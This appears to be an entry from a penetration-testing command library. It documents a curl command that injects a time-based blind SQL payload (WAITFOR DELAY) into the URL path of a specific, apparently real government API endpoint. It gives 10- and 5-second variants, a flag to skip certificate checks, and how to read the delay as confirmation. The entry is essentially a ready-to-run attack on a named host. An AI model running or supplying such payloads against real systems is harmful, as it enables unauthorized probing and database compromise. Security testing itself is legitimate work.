---
id: cmd-uuid-1
data: >-
  time curl -k
  "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
tags:
  - sqli
  - testing
  - timing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.046Z'
verified: false
validated: true
submitted: true
---
# time-curl-sql-delay-test

## Command

```bash
time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
```

## Description

This command tests for time-based blind SQL Injection by injecting a delay payload into a web endpoint and measuring the response time with the 'time' utility, confirming vulnerability if a significant delay occurs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Measures execution duration of the subsequent command | Yes |
| `curl` | HTTP client to send the request | Yes |
| `-k` | Insecure mode: skips SSL certificate verification | Yes (for self-signed certs) |
| URL payload | The injected string with WAITFOR DELAY for 10 seconds | Yes |

## Examples

### Basic Usage

```bash
time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
```

### Advanced Usage

For a shorter delay test (5 seconds):

```bash
time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:5'--+-"
```

## Expected Output

Output from curl (API response) followed by timing stats like:

real    0m10.2s
user    0m0.1s
sys     0m0.1s

A 'real' time exceeding 10 seconds indicates successful injection and delay execution.

## Related

- [[Related Procedure: Confirm-SQLi-with-Time-Based-Blind-Technique]]
